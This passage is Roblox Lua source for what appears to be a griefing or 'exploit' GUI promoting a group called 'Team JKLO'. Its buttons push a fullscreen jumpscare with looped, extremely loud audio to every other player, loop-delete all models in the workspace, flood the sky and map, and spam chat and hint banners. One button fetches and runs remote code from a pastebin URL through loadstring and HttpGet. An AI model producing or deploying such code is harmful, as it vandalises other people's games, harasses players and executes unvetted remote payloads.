    Sky.SkyboxFt = imageFour
    Sky.SkyboxLf = imageFour
    Sky.SkyboxRt = imageFour
    Sky.SkyboxUp = imageFour
    wait(0.25)
    Sky.SkyboxBk = imageFive
    Sky.SkyboxDn = imageFive
    Sky.SkyboxFt = imageFive
    Sky.SkyboxLf = imageFive
    Sky.SkyboxRt = imageFive
    Sky.SkyboxUp = imageFive
    wait(0.25)
    Sky.SkyboxBk = imageSix
    Sky.SkyboxDn = imageSix
    Sky.SkyboxFt = imageSix
    Sky.SkyboxLf = imageSix
    Sky.SkyboxRt = imageSix
    Sky.SkyboxUp = imageSix
    wait(0.25)
    Sky.SkyboxBk = imageSeven
    Sky.SkyboxDn = imageSeven
    Sky.SkyboxFt = imageSeven
    Sky.SkyboxLf = imageSeven
    Sky.SkyboxRt = imageSeven
    Sky.SkyboxUp = imageSeven
    wait(0.25)
    Sky.SkyboxBk = imageEight
    Sky.SkyboxDn = imageEight
    Sky.SkyboxFt = imageEight
    Sky.SkyboxLf = imageEight
    Sky.SkyboxRt = imageEight
    Sky.SkyboxUp = imageEight
    wait(0.25)
end
end)
daytonights.Name = "DayToNight"
daytonights.Parent = Frame
daytonights.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
daytonights.BorderColor3 = Color3.fromRGB(255, 255, 255)
daytonights.BorderSizePixel = 3
daytonights.Visible = false
daytonights.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
daytonights.Size = UDim2.new(0, 83, 0, 31)
daytonights.Font = Enum.Font.GothamBold
daytonights.Text = "BLOOD POP"
daytonights.TextColor3 = Color3.fromRGB(0, 0, 0)
daytonights.TextScaled = true
daytonights.TextSize = 14.000
daytonights.TextWrapped = true
daytonights.MouseButton1Down:connect(function()
k00p = Instance.new("Sound", game.Workspace)
		k00p.Name = "k00p"
		k00p.SoundId = "rbxassetid://6783714255"
		k00p.Volume = 9e9
        k00p.Pitch = 0.85
		k00p:Play()
end)
e666.Name = "e666"
e666.Parent = Frame
e666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e666.BorderColor3 = Color3.fromRGB(255, 255, 255)
e666.BorderSizePixel = 3
e666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
e666.Size = UDim2.new(0, 83, 0, 31)
e666.Font = Enum.Font.GothamBold
e666.Text = "NEXT"
e666.TextColor3 = Color3.fromRGB(0, 0, 0)
e666.TextScaled = true
e666.TextSize = 14.000
e666.TextWrapped = true
e666.MouseButton1Down:connect(function()
wait(0.2)
DSS.Visible = true
ARS.Visible = true
a666.Visible = true
DayToNights.Visible = true
Disc0s.Visible = true
e1x1x1x1Laughs.Visible = true
EpicSaxGuys.Visible = true
ForceFields.Visible = true
e2006Themes.Visible = true
Credits.Visible = false
CREDITS.Visible = false
ars.Visible = false
dss.Visible = false
daytonights.Visible = false
DayToNight.Visible = false
e1x1x1x1Laugh.Visible = false
DS.Visible = false
AR.Visible = false
ForceField.Visible = false
e2006Theme.Visible = false
Disc0.Visible = false
EpicSaxGuy.Visible = false
e666.Visible = false
wait(0.2)
end)
a666.Name = "e666"
a666.Parent = Frame
a666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
a666.BorderColor3 = Color3.fromRGB(255, 255, 255)
a666.BorderSizePixel = 3
a666.Visible = false
a666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
a666.Size = UDim2.new(0, 83, 0, 31)
a666.Font = Enum.Font.GothamBold
a666.Text = "NEXT"
a666.TextColor3 = Color3.fromRGB(0, 0, 0)
a666.TextScaled = true
a666.TextSize = 14.000
a666.TextWrapped = true
a666.MouseButton1Down:connect(function()
wait(0.2)
DSS.Visible = false
ARS.Visible = false
a666.Visible = false
DayToNights.Visible = false
Disc0s.Visible = false
e1x1x1x1Laughs.Visible = false
EpicSaxGuys.Visible = false
ForceFields.Visible = false
e2006Themes.Visible = false
E2006THEMES.Visible = false
Credits.Visible = true
CREDITS.Visible = true
DayToNight.Visible = true
e1x1x1x1Laugh.Visible = true
DS.Visible = true
AR.Visible = true
ForceField.Visible = true
e2006Theme.Visible = true
Disc0.Visible = true
EpicSaxGuy.Visible = true
e666.Visible = true
wait(0.2)
end)
f666.Name = "e666"
f666.Parent = Frame
f666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
f666.BorderColor3 = Color3.fromRGB(255, 255, 255)
f666.BorderSizePixel = 3
f666.Visible = false
f666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
f666.Size = UDim2.new(0, 83, 0, 31)
f666.Font = Enum.Font.GothamBold
f666.Text = "NEXT"
f666.TextColor3 = Color3.fromRGB(0, 0, 0)
f666.TextScaled = true
f666.TextSize = 14.000
f666.TextWrapped = true
f666.MouseButton1Down:connect(function()

end)
EpicSaxGuy.Name = "EpicSaxGuy"
EpicSaxGuy.Parent = Frame
EpicSaxGuy.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
EpicSaxGuy.BorderColor3 = Color3.fromRGB(255, 255, 255)
EpicSaxGuy.BorderSizePixel = 3
EpicSaxGuy.Position = UDim2.new(0.388888896, 0, 0.648000002, 0)
EpicSaxGuy.Size = UDim2.new(0, 83, 0, 34)
EpicSaxGuy.Font = Enum.Font.GothamBold
EpicSaxGuy.Text = "BOSSJKLOJumpscare"
EpicSaxGuy.TextColor3 = Color3.new(0, 0, 0)
EpicSaxGuy.TextScaled = true
EpicSaxGuy.TextSize = 14.000
EpicSaxGuy.TextWrapped = true
EpicSaxGuy.MouseButton1Down:connect(function()
    -- Made by Boss
for i,v in pairs(game.Players:GetPlayers()) do
		if v.Name ~= me and not v.PlayerGui:FindFirstChild("k00pkidd's Jumpscare") and v:FindFirstChild("PlayerGui") then
			spawn(function()
				local newgui = Instance.new("ScreenGui",v.PlayerGui)
				newgui.Name = "k00p's Jumpscare"
				local newimage = Instance.new("ImageLabel",newgui)
				newimage.Image = "http://www.roblox.com/Asset/?id=15573950094"
				newimage.Size = UDim2.new(1,1,1,1)
                                newimage.BackgroundTransparency = 1
				local s = Instance.new("Sound",newgui)
				s.SoundId = "rbxassetid://8683380188"
				s.Volume = 9e9
				s.Looped = true
				s:Play()
				print("Screamed "..v.Name)
				while wait(9) do

					newimage.Parent:Destroy()

				end
			end)
		end
	end
end)
EpicSaxGuys.Name = "EpicSaxGuy"
EpicSaxGuys.Parent = Frame
EpicSaxGuys.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
EpicSaxGuys.BorderColor3 = Color3.fromRGB(255, 255, 255)
EpicSaxGuys.BorderSizePixel = 3
EpicSaxGuys.Visible = false
EpicSaxGuys.Position = UDim2.new(0.388888896, 0, 0.648000002, 0)
EpicSaxGuys.Size = UDim2.new(0, 83, 0, 34)
EpicSaxGuys.Font = Enum.Font.GothamBold
EpicSaxGuys.Text = "TROLL"
EpicSaxGuys.TextColor3 = Color3.new(0, 0, 0)
EpicSaxGuys.TextScaled = true
EpicSaxGuys.TextSize = 14.000
EpicSaxGuys.TextWrapped = true
EpicSaxGuys.MouseButton1Down:connect(function()
wait(0.1)
gui1 = Instance.new("BillboardGui")
gui1.Parent = game.Workspace.Tubers93HKRB.Head
gui1.Adornee = game.Workspace.Tubers93HKRB.Head
gui1.Size = UDim2.new(2.5,0,2.5,0)
gui1.StudsOffset = Vector3.new(0,0,0)
gui1.AlwaysOnTop = true
text1 = Instance.new("ImageLabel")
text1.Image = "http://www.roblox.com/asset/?id=45120559"
text1.Size = UDim2.new(1,0,1,0)
text1.Position = UDim2.new(0,0,0,0)
text1.BackgroundTransparency = 1
text1.Parent = gui1
wait()
end)
Disc0.Name = "Disc0"
Disc0.Parent = Frame
Disc0.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
Disc0.BorderColor3 = Color3.fromRGB(255, 255, 255)
Disc0.BorderSizePixel = 3
Disc0.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
Disc0.Size = UDim2.new(0, 89, 0, 31)
Disc0.Font = Enum.Font.GothamBold
Disc0.Text = "TOADROAD"
Disc0.TextColor3 = Color3.fromRGB(0, 0, 0)
Disc0.TextScaled = true
Disc0.TextSize = 14.000
Disc0.TextWrapped = true
Disc0.MouseButton1Down:connect(function()
     --made by me

wait(0)
math.randomseed(tick() % 1 * 1e6)
sky = coroutine.create(function()
    while wait(0.3) do
        s = Instance.new("Sky",game.Lighting)
        s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408"
        s.CelestialBodiesShown = false
    end
end)
 
 
del = coroutine.create(function()
    while wait(0.3) do
        for i,v in pairs(workspace:GetChildren()) do
            if v:IsA("Model") then
                v:Destroy()
            end
        end
    end
end)
 
 
 
for i,v in pairs(game.Players:GetChildren()) do
end
 
noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
 
sound = coroutine.create(function()
    a = Instance.new("Sound",workspace)
    a.SoundId = "rbxassetid://141509625"
    a.Name = "RAINING HOOD404"
    a.Volume = 58359
    a.Looped = true
    a:Play()
    while wait(0.2) do
        rainin = workspace:FindFirstChild("RAINING MEN")
        if not rainin then
            a = Instance.new("Sound",workspace)
            a.SoundId = "rbxassetid://9007859985"
            a.Name = "RAINING HOOD404"
            a.Volume = 58359
            a.Looped = true
            a:Play()
        end
    end
end)
 
rain = coroutine.create(function()
    while wait(10 % 1 * 1e2) do
        part = Instance.new("Part",workspace)
        part.Name = "Meshes/toad (3)"
 
        mesh = Instance.new("SpecialMesh",part)
 
        sound = Instance.new("Sound",workspace)
 
        part.CanCollide = false
        part.Size = Vector3.new(440,530,380)
        part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
 
        sound.SoundId = noises[math.random(1,#noises)]
        sound:Play()
        sound.Ended:connect(function()
            sound:Destroy()
        end)
 
 
        mesh.MeshType = "FileMesh"
        mesh.MeshId = "rbxassetid://7234998844"
        mesh.TextureId = "rbxassetid://1009824086"
    end
end)
coroutine.resume(sky)
coroutine.resume(del)
coroutine.resume(sound)
coroutine.resume(msg)
coroutine.resume(rain)
 
local sound = Instance.new("Sound")
 
sound.Name = "HOOD404"
sound.SoundId = "http://www.roblox.com/asset/?id=1839246711" --Song
sound.Volume = .9999999999999999999999999999999999999999999999999999999999999999999 --Derp (I have good, loud speakers. You may need to change this.)
sound.Pitch = 1 --Speed of Playback
sound.Looped = true
sound.archivable = false
 
sound.Parent = game.Workspace
 
wait(0)
 
sound:play()
 
local h = Instance.new("Hint")
h.Parent = Workspace 
h.Text = "KingDof39 change the experience guys!!! have funð±ð"
wait(9999999999999)
h:Remove()
end)

Disc0s.Name = "Disc0"
Disc0s.Parent = Frame
Disc0s.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
Disc0s.BorderColor3 = Color3.fromRGB(255, 255, 255)
Disc0s.BorderSizePixel = 3
Disc0s.Visible = false
Disc0s.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
Disc0s.Size = UDim2.new(0, 89, 0, 31)
Disc0s.Font = Enum.Font.GothamBold
Disc0s.Text = "HINT"
Disc0s.TextColor3 = Color3.fromRGB(0, 0, 0)
Disc0s.TextScaled = true
Disc0s.TextSize = 14.000
Disc0s.TextWrapped = true
Disc0s.MouseButton1Down:connect(function()
local h = Instance.new("Hint")
h.Text = ""
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "T"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TE"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEA"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM J"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JK"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKL"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO J"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOI"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN T"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TOD"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TODA"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TODAY"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TODAY!"
h.Parent = workspace
wait(7)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TODA"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TOD"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN TO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN T"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOIN"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JOI"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO JO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO J"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKLO"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JKL"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM JK"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM J"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEAM"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TEA"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "TE"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = "T"
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = ""
h.Parent = workspace
wait(0.1)
local h = Instance.new("Hint")
h.Text = ""
h.Parent = workspace
end)
e2006Theme.Name = "e2006Theme"
e2006Theme.Parent = Frame
e2006Theme.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
e2006Theme.BorderColor3 = Color3.fromRGB(255, 255, 255)
e2006Theme.BorderSizePixel = 3
e2006Theme.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
e2006Theme.Size = UDim2.new(0, 89, 0, 31)
e2006Theme.Font = Enum.Font.GothamBold
e2006Theme.Text = "JKLO Chat"
e2006Theme.TextColor3 = Color3.fromRGB(0, 0, 0)
e2006Theme.TextScaled = true
e2006Theme.TextSize = 14.000
e2006Theme.TextWrapped = true
e2006Theme.MouseButton1Down:connect(function()
	--Made by Servano
local A_1 = "ð¡TEAM JKLO HERE!1!2!3!4!"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
wait(1)	
end)
e2006Themes.Name = "e2006Theme"
e2006Themes.Parent = Frame
e2006Themes.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
e2006Themes.BorderColor3 = Color3.fromRGB(255, 255, 255)
e2006Themes.BorderSizePixel = 3
e2006Themes.Visible = false
e2006Themes.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
e2006Themes.Size = UDim2.new(0, 89, 0, 31)
e2006Themes.Font = Enum.Font.GothamBold
e2006Themes.Text = "SKY SPAM"
e2006Themes.TextColor3 = Color3.fromRGB(0, 0, 0)
e2006Themes.TextScaled = true
e2006Themes.TextSize = 14.000
e2006Themes.TextWrapped = true
e2006Themes.MouseButton1Down:connect(function()
s = Instance.new("Sky")
		s.Name = "SKY"
		s.SkyboxBk = "http://www.roblox.com/Asset/?id=15573950094"
		s.SkyboxDn = "http://www.roblox.com/Asset/?id=15573950094"
		s.SkyboxFt = "http://www.roblox.com/Asset/?id=15573950094"
		s.SkyboxLf = "http://www.roblox.com/Asset/?id=15573950094"
		s.SkyboxRt = "http://www.roblox.com/Asset/?id=15573950094"
                s.SkyboxUp = "http://www.roblox.com/Asset/?id=15573950094"
                s.Parent = game.Lighting
wait()
E2006THEMES.Visible = true
e2006Themes.Visible = false
wait()
end)
E2006THEMES.Name = "e2006Theme"
E2006THEMES.Parent = Frame
E2006THEMES.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
E2006THEMES.BorderColor3 = Color3.fromRGB(255, 255, 255)
E2006THEMES.BorderSizePixel = 3
E2006THEMES.Visible = false
E2006THEMES.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
E2006THEMES.Size = UDim2.new(0, 89, 0, 31)
E2006THEMES.Font = Enum.Font.GothamBold
E2006THEMES.Text = "SKY SPAM"
E2006THEMES.TextColor3 = Color3.fromRGB(0, 0, 0)
E2006THEMES.TextScaled = true
E2006THEMES.TextSize = 14.000
E2006THEMES.TextWrapped = true
E2006THEMES.MouseButton1Down:connect(function()
s = Instance.new("Sky")
		s.Name = "SKY"
		s.SkyboxBk = "http://www.roblox.com/Asset/?id=15651176489"
		s.SkyboxDn = "http://www.roblox.com/Asset/?id=15651176489"
		s.SkyboxFt = "http://www.roblox.com/Asset/?id=15651176489"
		s.SkyboxLf = "http://www.roblox.com/Asset/?id=15651176489"
		s.SkyboxRt = "http://www.roblox.com/Asset/?id=15651176489"
                s.SkyboxUp = "http://www.roblox.com/Asset/?id=15651176489"
                s.Parent = game.Lighting
wait()
E2006THEMES.Visible = false
e2006Themes.Visible = true
wait()
end)
ForceField.Name = "ForceField"
ForceField.Parent = Frame
ForceField.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
ForceField.BorderColor3 = Color3.fromRGB(255, 255, 255)
ForceField.BorderSizePixel = 3
ForceField.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
ForceField.Size = UDim2.new(0, 89, 0, 34)
ForceField.Font = Enum.Font.GothamBold
ForceField.Text = "Thomas"
ForceField.TextColor3 = Color3.fromRGB(0, 0, 0)
ForceField.TextScaled = true
ForceField.TextSize = 14.000
ForceField.TextWrapped = true
ForceField.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/WB9swe5w"))()
end)
ForceFields.Name = "ForceField"
ForceFields.Parent = Frame
ForceFields.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
ForceFields.Visible = false
ForceFields.BorderColor3 = Color3.fromRGB(255, 255, 255)
ForceFields.BorderSizePixel = 3
ForceFields.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
ForceFields.Size = UDim2.new(0, 89, 0, 34)
ForceFields.Font = Enum.Font.GothamBold
ForceFields.Text = "JKLO Chat2"
ForceFields.TextColor3 = Color3.fromRGB(0, 0, 0)
ForceFields.TextScaled = true
ForceFields.TextSize = 14.000
ForceFields.TextWrapped = true
ForceFields.MouseButton1Down:connect(function()
local A_1 = "ð¡JKLO TEAM!1!4!"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
wait(1)
local A_1 = "ð¡HAHAH!?!?1!"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
wait(1)
local A_1 = "ð¤JUPAL IS LOOKING AT YOU!1?8!2!9"
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
end)
-- Scripts:

local function QFCS_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(QFCS_fake_script)()
local function PKIPWI_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	while wait() do
		for i = 0,255,5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
			wait(0.01)
		end
		for i = 255,0,-5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(i,255,0)
			wait(0.01)
		end
		for i = 0,255,5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(0,255,i)
			wait(0.01)
		end
		for i = 255,0,-5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(0,i,255)
			wait(0.01)
		end
		for i = 0,255,5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(i,0,255)
			wait(0.01)
		end
		for i = 255,0,-5 do
			script.Parent.BackgroundColor3 = Color3.fromRGB(255,0,i)
			wait(0.01)
		end
	end
end
coroutine.wrap(PKIPWI_fake_script)()
local function PKIPWI_fake_script() -- Name.LocalScript 
	local script = Instance.new('LocalScript', Name)

	while true do
    script.Parent.TextColor3 = Color3.new(255/255,0/255,0/255)
    for i = 0,255,10 do
        wait()
        script.Parent.TextColor3 = Color3.new(255/255,i/255,0/255)
    end
    for i = 255,0,-10 do
        wait()
        script.Parent.TextColor3 = Color3.new(i/255,255/255,0/255)
    end
    for i = 0,255,10 do
        wait()
        script.Parent.TextColor3 = Color3.new(0/255,255/255,i/255)
    end
    for i = 255,0,-10 do
        wait()
        script.Parent.TextColor3 = Color3.new(0/255,i/255,255/255)
    end
    for i = 0,255,10 do
        wait()
        script.Parent.TextColor3 = Color3.new(i/255,0/255,255/255)
    end
    for i = 255,0,-10 do
        wait()
        script.Parent.TextColor3 = Color3.new(255/255,0/255,i/255)
    end
end
end
coroutine.wrap(PKIPWI_fake_script)()